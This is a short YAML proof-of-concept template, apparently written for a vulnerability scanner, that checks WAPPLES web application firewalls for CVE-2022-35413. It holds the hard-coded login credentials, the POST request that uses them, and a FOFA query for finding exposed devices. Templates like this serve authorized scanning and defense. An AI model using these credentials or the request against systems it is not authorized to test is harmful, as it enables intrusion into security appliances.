id: poc-yaml-wapples-waf-hardcoded-credentials
info:
  name: Wapples Web应用防火墙硬编码漏洞(CVE-2022-35413)
  severity: critical
  tags:
  - CVE-2022-35413
  - 使用硬编码凭据
  finger: wapples
  fofa: title="Intelligent WAPPLES"
requests:
- method: POST
  path: /webapi/auth
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: id=systemi&password=db/wp.no1
  expression: 'status_code == 200

    && contains(body,"Authentication Success")

    && contains(body,"user_systemi")

    && contains(headers,"WP_SESSID=")

    '
variables: {}
transport: http
